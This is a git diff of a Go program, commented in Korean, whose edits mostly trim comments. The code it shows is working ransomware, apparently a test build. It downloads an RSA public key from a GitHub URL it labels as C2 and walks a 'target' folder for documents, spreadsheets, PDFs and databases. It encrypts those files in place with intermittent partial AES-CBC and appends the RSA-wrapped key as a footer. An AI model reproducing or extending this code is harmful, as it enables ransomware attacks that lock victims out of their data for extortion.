@@ -16,6 +16,7 @@ import (
 	"strings"
 )
 
+// 타겟 상수 및 키 주소
 const (
 	TargetDir = "target"
 	Stride    = 50 // 수십 바이트 단위로 점프
@@ -24,7 +25,7 @@ const (
 	C2PublicKeyURL = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/key/public.pem"
 )
 
-// 대상 확장자 목록 정의
+// 대상 확장자
 var targetExtensions = map[string]bool{
 	// 문서
 	".txt": true, ".docx": true, ".xlsx": true, ".pptx": true, ".pdf": true, ".hwp": true,
@@ -38,7 +39,7 @@ var targetExtensions = map[string]bool{
 	".db": true, ".sqlite": true, ".sql": true, ".mdb": true,
 }
 
-// C2로부터 일반 PEM 공개키를 받아와 파싱하는 함수
+// C2에서 RSA 공개키를 받는 함수
 func getPublicKeyFromC2(url string) (*rsa.PublicKey, error) {
 	resp, err := http.Get(url)
 	if err != nil {
@@ -55,13 +56,11 @@ func getPublicKeyFromC2(url string) (*rsa.PublicKey, error) {
 		return nil, fmt.Errorf("본문 읽기 실패: %v", err)
 	}
 
-	// PEM 블록 디코딩
 	block, _ := pem.Decode(pemBytes)
 	if block == nil {
 		return nil, fmt.Errorf("PEM 디코딩 실패 (올바른 PEM 형식이 아닙니다)")
 	}
 
-	// RSA 공개키 파싱
 	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
 	if err != nil {
 		return nil, fmt.Errorf("공개키 파싱 실패: %v", err)
@@ -70,7 +69,7 @@ func getPublicKeyFromC2(url string) (*rsa.PublicKey, error) {
 	return pub.(*rsa.PublicKey), nil
 }
 
-// 개별 파일을 암호화하는 함수
+// 파일 암호화 함수
 func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
 	// 무작위 AES 대칭키(32바이트) 생성
 	aesKey := make([]byte, 32)
@@ -99,7 +98,7 @@ func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
 	iv := make([]byte, BlockSize)
 	mode := cipher.NewCBCEncrypter(block, iv)
 
-	// 간헐적 부분 암호화 진행
+	// 부분 암호화
 	var offset int64 = 0
 	buf := make([]byte, BlockSize)
 	encBuf := make([]byte, BlockSize)
@@ -116,15 +115,12 @@ func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
 			break
 		}
 
-		// 블록 암호화 수행
 		mode.CryptBlocks(encBuf, buf)
 
-		// 제자리에 덮어쓰기
 		_, _ = file.Seek(offset, 0)
 		_, _ = file.Write(encBuf)
 
 		encryptedBlocks++
-		// 오프셋을 블록 크기 + Stride 간격만큼 이동
 		offset += int64(BlockSize) + int64(Stride)
 	}
 
@@ -140,7 +136,7 @@ func encryptFile(filePath string, publicKey *rsa.PublicKey) error {
 		return fmt.Errorf("RSA 대칭키 암호화 실패: %w", err)
 	}
 
-	// 암호화된 대칭키를 파일 끝(EOF)에 푸터로 결합
+	// 암호화된 대칭키를 파일 끝에 푸터로 결합
 	_, _ = file.Seek(0, 2)
 	_, _ = file.Write([]byte("\n---ENC_KEY_START---"))
 	_, _ = file.Write(encryptedAESKey)
@@ -170,7 +166,7 @@ func main() {
 			return nil
 		}
 
-		// 확장자 검사 (소문자로 통일)
+		// 확장자 검사
 		ext := strings.ToLower(filepath.Ext(path))
 		if targetExtensions[ext] {
 			fmt.Printf("[*] 암호화 대상 발견: %s\n", path)
